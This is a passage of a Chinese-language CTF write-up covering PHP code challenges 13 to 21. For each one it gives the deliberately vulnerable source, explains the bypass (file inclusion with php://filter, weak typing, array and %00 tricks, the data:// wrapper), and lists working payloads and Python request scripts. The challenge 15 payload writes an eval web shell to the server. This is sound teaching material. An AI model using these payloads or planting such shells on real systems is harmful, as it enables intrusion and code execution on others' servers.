<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">'http://148.70.62.239:23013/challenge13.php'</span></span><br><span class="line">a=requests.Session()</span><br><span class="line">b=a.get(url+<span class="string">'?value[]=ea'</span>).text</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    b=a.get(url+<span class="string">'?value[]='</span>+ b[<span class="number">0</span>:<span class="number">2</span>]).text <span class="comment"># //这里的b[0:2]是获取读取的源代码的前两个字符,因为手工传一次`?value[]=ea`后可以发现，新的随机数在源码最前面  </span></span><br><span class="line">    print(b[<span class="number">0</span>:<span class="number">30</span>])</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/12/PHP_Code_Challenge/1588990386149.png" alt="1588990386149"></p>
<p>也可以手动传参<br><img src="/2020/05/12/PHP_Code_Challenge/1588990523440.png" alt="1588990523440"></p>
<h1 id="challenge14"><a href="#challenge14" class="headerlink" title="challenge14"></a>challenge14</h1><p>源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'path'</span>]))&#123;</span><br><span class="line">    <span class="keyword">include</span>($_REQUEST[<span class="string">'path'</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">'phpinfo.php'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>简单的文件包含，并且allow_url_include为on，所以可以使用php伪协议</p>
<p>先使用php://input查看flag文件<br><img src="/2020/05/12/PHP_Code_Challenge/1588995335310.png" alt="1588995335310"></p>
<p>payload：</p>
<blockquote>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">?path=php:<span class="regexp">//</span>filter<span class="regexp">/convert.base64-encode/</span>resource=flag.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="/2020/05/12/PHP_Code_Challenge/1588994986432.png" alt="1588994986432"></p>
<h1 id="challenge15"><a href="#challenge15" class="headerlink" title="challenge15"></a>challenge15</h1><p>源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET) &amp;&amp; !<span class="keyword">empty</span>($_GET))&#123;</span><br><span class="line">    $url = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    $path = <span class="string">'upload/'</span>.$_GET[<span class="string">'path'</span>]; 	<span class="comment">#拼接路径</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(strpos($path,<span class="string">'..'</span>) &gt; <span class="number">-1</span>)&#123;	<span class="comment">#&amp;path不能包含..</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'SYCwaf!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(strpos($url,<span class="string">'http://127.0.0.1/'</span>) === <span class="number">0</span>)&#123;			<span class="comment">#url只能以http://127.0.0.1/开头</span></span><br><span class="line">    file_put_contents($path, file_get_contents($url));<span class="comment">#读取url中的内容，写入path中</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"console.log($path update successed!)"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Hello.Geeker"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>strpos() f函数查找字符串在另一字符串中第一次出现的位置（区分大小写）</p>
<p>file_get_contents</p>
<p>将整个文件读入一个字符串</p>
<figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line">和 <span class="function"><span class="title">file</span>() 一样，只除了 <span class="title">file_get_contents</span>() 把文件读入一个字符串。将在参数 <span class="variable">offset</span> 所指定的位置开始读取长度为 <span class="variable">maxlen</span> 的内容。如果失败，<span class="title">file_get_contents</span>() 将返回 <span class="variable"><span class="literal">FALSE</span></span>。 </span></span><br><span class="line"><span class="function"><span class="title">file_get_contents</span>() 函数是用来将文件的内容读入到一个字符串中的首选方法。如果操作系统支持还会使用内存映射技术来增强性能。 </span></span><br><span class="line"><span class="function"><span class="variable">Note</span>: </span></span><br><span class="line"><span class="function">如果要打开有特殊字符的 <span class="variable">URL</span> （比如说有空格），就需要使用 <span class="title">urlencode</span>() 进行 <span class="variable">URL</span> 编码。 </span></span><br><span class="line"><span class="function"></span></span><br></pre></td></tr></table></figure>

<p>file_put_contents</p>
<p>将一个字符串写入文件<br><code>和依次调用 fopen()，fwrite() 以及 fclose() 功能一样。</code></p>
</blockquote>
<p>程序会访问url中的<code>file</code>，然后将返回内容写入到<code>$path</code>文件中，如果不存在返回空，再返回含<code>$path</code>的页面<br>首先构随便构造一个</p>
<blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//148.70.62.239:23015/?path=aaa%3C?php%20phpinfo();?%3Ebbb&amp;file=http://127.0.0.1/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
</blockquote>
<p>成功将<a href="http://127.0.0.1中的内容写入aaa%3C?php%20phpinfo();?%3Ebbb文件中，并且发现PHP代码解析了" target="_blank" rel="noopener">http://127.0.0.1中的内容写入aaa%3C?php%20phpinfo();?%3Ebbb文件中，并且发现PHP代码解析了</a><br><img src="/2020/05/12/PHP_Code_Challenge/1589009096567.png" alt="1589009096567"></p>
<p>如果将该地址作为一个新的file，那么就会将把返回的<code>console.log(upload/aaabbb update successed!)</code>写入另一个文件中，即实现了写入一句话木马，由于php作为文件名的时候被解析了，所以要进行一次url编码，并且要将地址改为127.0.0.1</p>
<p>最终payload</p>
<blockquote>
<figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line">http://<span class="number">148.70</span>.<span class="number">62.239</span>:<span class="number">23015</span>/<span class="built_in">?path</span>=shell.php&amp;file=http://<span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span>/?file=http://<span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span>/<span class="built_in">&amp;path</span>=&lt;?php+@eval(<span class="variable">$_POST</span>[a]);?&gt;</span><br><span class="line">编码后</span><br><span class="line">http://<span class="number">148.70</span>.<span class="number">62.239</span>:<span class="number">23015</span>/<span class="built_in">?path</span>=shell.php&amp;file=http<span class="meta">%3a</span><span class="meta">%2f</span><span class="meta">%2f127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span><span class="meta">%2f</span><span class="meta">%3ffile</span><span class="meta">%3dhttp</span><span class="meta">%3a</span><span class="meta">%2f</span><span class="meta">%2f127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span><span class="meta">%2f</span><span class="meta">%26path</span><span class="meta">%3d</span><span class="meta">%3c</span><span class="meta">%3fphp</span><span class="meta">%2b</span><span class="meta">%40eval</span>(<span class="meta">%24_POST</span><span class="meta">%5ba</span><span class="meta">%5d</span>)<span class="meta">%3b</span><span class="meta">%3f</span><span class="meta">%3e</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
</blockquote>
<p>进行url编码的时候要将空格用+代替进行编码</p>
<p><img src="/2020/05/12/PHP_Code_Challenge/1589010937407.png" alt="1589010937407"></p>
<p><img src="/2020/05/12/PHP_Code_Challenge/1589010955624.png" alt="1589010955624"></p>
<h1 id="challenge16"><a href="#challenge16" class="headerlink" title="challenge16"></a>challenge16</h1><p>源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">"submit"</span>]))  </span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'hihi'</span>]))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (ereg(<span class="string">"^[a-zA-Z0-9]+$"</span>, $_POST[<span class="string">'hihi'</span>]) === <span class="keyword">FALSE</span>)	<span class="comment">#只能是数字和字母</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">exit</span>(<span class="string">'&lt;script&gt;alert("have fun:)")&lt;/script&gt;'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span> (strlen($_POST[<span class="string">'hihi'</span>]) &lt; <span class="number">11</span> &amp;&amp; $_POST[<span class="string">'hihi'</span>] &gt; <span class="number">999999999</span>)<span class="comment">#可以通过科学计数法绕过</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (strpos($_POST[<span class="string">'hihi'</span>], <span class="string">'#HONG#'</span>) !== <span class="keyword">FALSE</span>)	<span class="comment">#hihi中存在#HONG</span></span><br><span class="line">          				<span class="comment">#数组绕过或者%00截断</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> (!is_array($_POST[<span class="string">'hihi'</span>])) &#123;	<span class="comment">#hihi不为数组</span></span><br><span class="line">        <span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Congratulations! FLAG is : "</span>.$flag;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">'&lt;script&gt;alert("nonono")&lt;/script&gt;'</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">'&lt;script&gt;alert("nonono")&lt;/script&gt;'</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">exit</span>(<span class="string">'&lt;script&gt;alert("sorry")&lt;/script&gt;'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的</p>
</blockquote>
<p>payload:</p>
<blockquote>
<p>hihi=9e9%00#HONG#&amp;submit=1</p>
</blockquote>
<p><img src="/2020/05/12/PHP_Code_Challenge/1589012783822.png" alt="1589012783822"></p>
<h1 id="challenge17"><a href="#challenge17" class="headerlink" title="challenge17"></a>challenge17</h1><p>源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">header(<span class="string">"Content-type: text/html; charset=utf-8"</span>); </span><br><span class="line">    <span class="keyword">include</span>(<span class="string">'flag.php'</span>); </span><br><span class="line">    $smile = <span class="number">1</span>;  </span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span> ($_GET[<span class="string">'^_^'</span>])) $smile = <span class="number">0</span>;  </span><br><span class="line">    <span class="keyword">if</span> (ereg (<span class="string">'\.'</span>, $_GET[<span class="string">'^_^'</span>])) $smile = <span class="number">0</span>;  </span><br><span class="line">    <span class="keyword">if</span> (ereg (<span class="string">'%'</span>, $_GET[<span class="string">'^_^'</span>])) $smile = <span class="number">0</span>;  </span><br><span class="line">    <span class="keyword">if</span> (ereg (<span class="string">'[0-9]'</span>, $_GET[<span class="string">'^_^'</span>])) $smile = <span class="number">0</span>;  </span><br><span class="line">    <span class="keyword">if</span> (ereg (<span class="string">'http'</span>, $_GET[<span class="string">'^_^'</span>]) ) $smile = <span class="number">0</span>;  </span><br><span class="line">    <span class="keyword">if</span> (ereg (<span class="string">'https'</span>, $_GET[<span class="string">'^_^'</span>]) ) $smile = <span class="number">0</span>;  </span><br><span class="line">    <span class="keyword">if</span> (ereg (<span class="string">'ftp'</span>, $_GET[<span class="string">'^_^'</span>])) $smile = <span class="number">0</span>;  </span><br><span class="line">    <span class="keyword">if</span> (ereg (<span class="string">'telnet'</span>, $_GET[<span class="string">'^_^'</span>])) $smile = <span class="number">0</span>;  </span><br><span class="line">    <span class="keyword">if</span> (ereg (<span class="string">'_'</span>, $_SERVER[<span class="string">'QUERY_STRING'</span>])) $smile = <span class="number">0</span>;  <span class="comment">#url ?后面不存在_</span></span><br><span class="line">    <span class="keyword">if</span> ($smile) &#123; </span><br><span class="line">        <span class="keyword">if</span> (@file_exists ($_GET[<span class="string">'^_^'</span>])) $smile = <span class="number">0</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">if</span> ($smile) &#123; </span><br><span class="line">        $smile = @file_get_contents ($_GET[<span class="string">'^_^'</span>]);  </span><br><span class="line">        <span class="keyword">if</span> ($smile === <span class="string">"(●'◡'●)"</span>) <span class="keyword">die</span>($flag);  </span><br><span class="line">    &#125;  </span><br><span class="line">show_source(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>QUERY_STRING就是URL后接的参数</p>
<p>file_exists() 函数检查文件或目录是否存在。</p>
<p>如果指定的文件或目录存在则返回 true，否则返回 false</p>
</blockquote>
<p>搜索引擎会忽略下划线的存在<br>当<code>.</code>或<code>[]</code>之类的符号作为参数的key的时候，会被PHP改写为<code>_</code>，所以传入^.^便能绕过。<code>file_get_contents</code>可以获取远程数据，但常用网络协议已经被过滤，因此需要选取其他协议。查阅PHP支持的协议和包装，发现RFC 2397的data协议可用。巧合的是，<code>file_exists</code>对于data指向内容判断为不存在<br>payload：</p>
<blockquote>
<p>?^.^=data://text/plain;charset=unicode,(●’◡’●)</p>
</blockquote>
<p><img src="/2020/05/12/PHP_Code_Challenge/1589014602979.png" alt="1589014602979"></p>
<h1 id="challenge18"><a href="#challenge18" class="headerlink" title="challenge18"></a>challenge18</h1><p>在challenge18.php~中发现源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Content-type: text/html; charset=utf-8"</span>); </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'login'</span>]))</span><br><span class="line">     &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'user'</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(@strcmp($_POST[<span class="string">'user'</span>],$USER))<span class="comment">//USER是被隐藏的复杂用户名</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">'user错误！'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'name'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ($_POST[<span class="string">'name'</span>] == $_POST[<span class="string">'password'</span>] )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">'账号密码不能一致！'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (md5($_POST[<span class="string">'name'</span>]) === md5($_POST[<span class="string">'password'</span>]))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(is_numeric($_POST[<span class="string">'id'</span>])&amp;&amp;$_POST[<span class="string">'id'</span>]!==<span class="string">'72'</span> &amp;&amp; !preg_match(<span class="string">'/\s/'</span>, $_POST[<span class="string">'id'</span>]))</span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="keyword">if</span>($_POST[<span class="string">'id'</span>]==<span class="number">72</span>)</span><br><span class="line">                            <span class="keyword">die</span>(<span class="string">"flag&#123;xxxxxxxxxxxxx&#125;"</span>);</span><br><span class="line">                        <span class="keyword">else</span></span><br><span class="line">                            <span class="keyword">die</span>(<span class="string">"ID错误2！"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">"ID错误1！"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">die</span>(<span class="string">'账号密码错误！'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">strcmp	比较两个字符串（区分大小写）：</span><br><span class="line">本函数返回：</span><br><span class="line"></span><br><span class="line"> <span class="number">0</span> - 如果两个字符串相等</span><br><span class="line"> &lt;<span class="number">0</span> - 如果 <span class="built_in">string</span>1 小于 <span class="built_in">string</span>2</span><br><span class="line"> &gt;<span class="number">0</span> - 如果 <span class="built_in">string</span>1 大于 <span class="built_in">string</span>2</span><br><span class="line">在PHP5<span class="number">.3</span>版本之后使用这个函数比较<span class="built_in">array</span>跟sring会返回<span class="number">0</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
</blockquote>
<p>所以strcmp函数可以使用数组绕过，接着是md5===判断，也可以使用数组绕过<br>最后一点id，不能为数字72，又不能等于字符串<code>’72’</code>，不包含空白符，这里也是弱类型，floor类型<code>72.00</code><br>payload:</p>
<blockquote>
<p>user[]=a&amp;name[]=1&amp;password[]=12&amp;id=72.0&amp;login=Check</p>
</blockquote>
<p><img src="/2020/05/12/PHP_Code_Challenge/1589017428569.png" alt="1589017428569"></p>
<h1 id="challenge19"><a href="#challenge19" class="headerlink" title="challenge19"></a>challenge19</h1><p>源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'flag.php'</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'sss'</span>]))&#123;</span><br><span class="line">    show_source(<span class="string">'challenge19.php'</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">$sss=$_GET[<span class="string">'sss'</span>];</span><br><span class="line"><span class="keyword">if</span>(strlen($sss)==<span class="number">666</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/[^0-6]/"</span>,$sss))&#123;	<span class="comment">#只能包含 0--6 的数字</span></span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">'$sss='</span>.$sss.<span class="string">';'</span>);</span><br><span class="line">        <span class="keyword">if</span>($sss!==<span class="string">'0x666'</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>($sss==<span class="string">'0x666'</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> $flag;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>通过分析可知我们需要创建一个长度为 666 ,只包含0 – 6的数字，数值上等于 0x666且不等于字符串 ‘0x666’的参数，所以我们用八进制就可以了，创建 $sss = ‘00…03146’即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://148.70.62.239:23019/challenge19.php?sss='</span>+<span class="string">'0'</span>*<span class="number">662</span>+<span class="string">'3146'</span></span><br><span class="line">html = requests.get(url)</span><br><span class="line">print(html.content)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/12/PHP_Code_Challenge/1589037176956.png" alt="1589037176956"></p>
<h1 id="challenge20"><a href="#challenge20" class="headerlink" title="challenge20"></a>challenge20</h1><p>源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'flag.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_GET[<span class="string">'user'</span>])) <span class="keyword">die</span>(show_source(<span class="keyword">__FILE__</span>));</span><br><span class="line"></span><br><span class="line">$user = [<span class="string">'admin'</span>, <span class="string">'xxoo'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'user'</span>] === $user &amp;&amp; $_GET[<span class="string">'user'</span>][<span class="number">0</span>] != <span class="string">'admin'</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>$_GET[‘user’]</code> 是一个全局的变量，我们传的是字符串，它就是字符串，传的是数组，那么它的值就是数组</li>
<li><code>$user</code> 是一个数组, <code>[0 =&gt; ‘admin’, 1 =&gt; ‘xxoo’]</code></li>
<li><code>===</code> 三个等号的意思就是类型是同一类型，并且值也是相同的</li>
<li><code>$_GET[‘user’][0]</code> 的值不能等于 <code>‘admin’</code></li>
</ul>
<p>若要使这个 if 条件成立，就必须让两个键值不相等的数组经过 <code>===</code> 比较后返回 true</p>
<p>测试下面几个例子</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump([<span class="number">1</span>=&gt;<span class="number">0</span>]==[<span class="number">1</span>=&gt;<span class="number">0</span>]);</span><br><span class="line">var_dump([<span class="number">1</span>=&gt;<span class="number">0</span>]===[<span class="number">1</span>=&gt;<span class="number">0</span>]);</span><br><span class="line">var_dump([<span class="number">1</span>=&gt;<span class="number">0</span>]==[<span class="number">2</span>=&gt;<span class="number">0</span>]);</span><br><span class="line">var_dump([<span class="number">1</span>=&gt;<span class="number">0</span>]===[<span class="number">2</span>=&gt;<span class="number">0</span>]);</span><br><span class="line">var_dump([<span class="number">0</span> =&gt; <span class="number">0</span>] === [<span class="number">0x100000000</span> =&gt; <span class="number">0</span>]);</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/12/PHP_Code_Challenge/1589069580133.png" alt="1589069580133"></p>
<p>当PHP版本为5.6及以下时，<code>var_dump([0 =&gt; 0] === [0x100000000 =&gt; 0]);</code>返回了true<br>即可以通过这个漏洞绕过<br>payload</p>
<blockquote>
<figure class="highlight nsis"><table><tr><td class="code"><pre><span class="line">?<span class="literal">user</span>[<span class="number">4294967296</span>]=<span class="literal">admin</span>&amp;<span class="literal">user</span>[<span class="number">1</span>]=xxoo</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</blockquote>
<p>2^32 == 0x100000000 == 4294967296 由于是截断漏洞，所以 0x100000000 后面再多几个 0 也是可以的，适当转换成对应的 10 进制数</p>
<p><img src="/2020/05/12/PHP_Code_Challenge/1589070166987.png" alt="1589070166987"></p>
<h1 id="challenge21"><a href="#challenge21" class="headerlink" title="challenge21"></a>challenge21</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">'flag.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>  (<span class="string">"POST"</span> == $_SERVER[<span class="string">'REQUEST_METHOD'</span>])</span><br><span class="line">&#123;</span><br><span class="line">    $password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> &gt;= preg_match(<span class="string">'/^[[:graph:]]&#123;12,&#125;$/'</span>, $password))	<span class="comment">#可见字符超过12个</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Wrong Format'</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="keyword">TRUE</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        $reg = <span class="string">'/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/'</span>;</span><br><span class="line">        		<span class="comment">#标点符号，数字，大小写字母</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="number">6</span> &gt; preg_match_all($reg, $password, $arr))</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        $c = <span class="number">0</span>;</span><br><span class="line">        $ps = <span class="keyword">array</span>(<span class="string">'punct'</span>, <span class="string">'digit'</span>, <span class="string">'upper'</span>, <span class="string">'lower'</span>);</span><br><span class="line">        <span class="keyword">foreach</span> ($ps <span class="keyword">as</span> $pt)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">"/[[:$pt:]]+/"</span>, $password))</span><br><span class="line">            $c += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($c &lt; <span class="number">3</span>) <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">"42"</span> == $password) <span class="keyword">echo</span> $flag;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">'Wrong password'</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="left">POSIX</th>
<th align="left">Description</th>
<th>ASCII</th>
<th>Unicode</th>
<th>Shorthand</th>
<th align="right">Java</th>
</tr>
</thead>
<tbody><tr>
<td align="left">[:alnum:]</td>
<td align="left">Alphanumeric characters</td>
<td>[a-zA-Z0-9]</td>
<td>[\p{L&amp;}\p{Nd}]</td>
<td></td>
<td align="right">\p{Alnum}</td>
</tr>
<tr>
<td align="left">[:alpha:]</td>
<td align="left">Alphabetic characters</td>
<td>[a-zA-Z]</td>
<td>\p{L&amp;}</td>
<td></td>
<td align="right">\p{Alpha}</td>
</tr>
<tr>
<td align="left">[:ascii:]</td>
<td align="left">ASCII characters</td>
<td>[\x00-\x7F]</td>
<td>\p{InBasicLatin}</td>
<td></td>
<td align="right">\p{ASCII}</td>
</tr>
<tr>
<td align="left">[:blank:]</td>
<td align="left">Space and tab</td>
<td>[ \t]</td>
<td>[\p{Zs}\t]</td>
<td>\h</td>
<td align="right">\p{Blank}</td>
</tr>
<tr>
<td align="left">[:cntrl:]</td>
<td align="left">Control characters</td>
<td>[\x00-\x1F\x7F]</td>
<td>\p{Cc}</td>
<td></td>
<td align="right">\p{Cntrl}</td>
</tr>
<tr>
<td align="left">[:digit:]</td>
<td align="left">Digits</td>
<td>[0-9]</td>
<td>\p{Nd}</td>
<td>\d</td>
<td align="right">\p{Digit}</td>
</tr>
<tr>
<td align="left">[:graph:]</td>
<td align="left">可见字符（即空格，控制字符等除外）</td>
<td>[\x21-\x7E]</td>
<td>[^\p{Z}\p{C}]</td>
<td></td>
<td align="right">\p{Graph}</td>
</tr>
<tr>
<td align="left">[:lower:]</td>
<td align="left">Lowercase letters</td>
<td>[a-z]</td>
<td>\p{Ll}</td>
<td></td>
<td align="right">\p{Lower}</td>
</tr>
<tr>
<td align="left">[:print:]</td>
<td align="left">Visible characters and spaces (i.e. anything except control characters, etc.)</td>
<td>[\x20-\x7E]</td>
<td>\P{C}</td>
<td></td>
<td align="right">\p{Print}</td>
</tr>
<tr>
<td align="left">[:punct:]</td>
<td align="left">标点和符号</td>
<td>[!”#$%&amp;’()*+,  -./:;&lt;=&gt;?@  [\]^_`{|}~]</td>
<td>[\p{P}\p{S}]</td>
<td></td>
<td align="right">\p{Punct}</td>
</tr>
<tr>
<td align="left">[:space:]</td>
<td align="left">All whitespace characters, including line breaks</td>
<td>[ \t\r\n\v\f]</td>
<td>[\p{Z}\t\r\n\v\f]</td>
<td>\s</td>
<td align="right">\p{Space}</td>
</tr>
<tr>
<td align="left">[:upper:]</td>
<td align="left">Uppercase letters</td>
<td>[A-Z]</td>
<td>\p{Lu}</td>
<td></td>
<td align="right">\p{Upper}</td>
</tr>
<tr>
<td align="left">[:word:]</td>
<td align="left">Word characters (letters, numbers and underscores)</td>
<td>[A-Za-z0-9_]</td>
<td>[\p{L}\p{N}\p{Pc}]</td>
<td>\w</td>
<td align="right"></td>
</tr>
<tr>
<td align="left">[:xdigit:]</td>
<td align="left">Hexadecimal digits</td>
<td>[A-Fa-f0-9]</td>
<td>[A-Fa-f0-9]</td>
<td></td>
<td align="right">\p{XDigit}</td>
</tr>
</tbody></table>
<blockquote>
<p>preg_match_all 函数用于执行一个全局正则表达式匹配。</p>
<p><strong>语法</strong></p>
<figure class="highlight smali"><table><tr><td class="code"><pre><span class="line">int preg_match_all ( string $pattern , string $subject [,<span class="built_in"> array </span>&amp;$matches [,<span class="built_in"> int </span>$flags = PREG_PATTERN_ORDER [,<span class="built_in"> int </span>$offset = 0 ]]] )</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>搜索 subject 中所有匹配 pattern 给定正则表达式的匹配结果并且将它们以 flag 指定顺序输出到 matches 中。 </p>
<p>在第一个匹配找到后, 子序列继续从最后一次匹配位置搜索。</p>
<p>参数说明：</p>
<ul>
<li>$pattern: 要搜索的模式，字符串形式。</li>
<li>$subject: 输入字符串。</li>
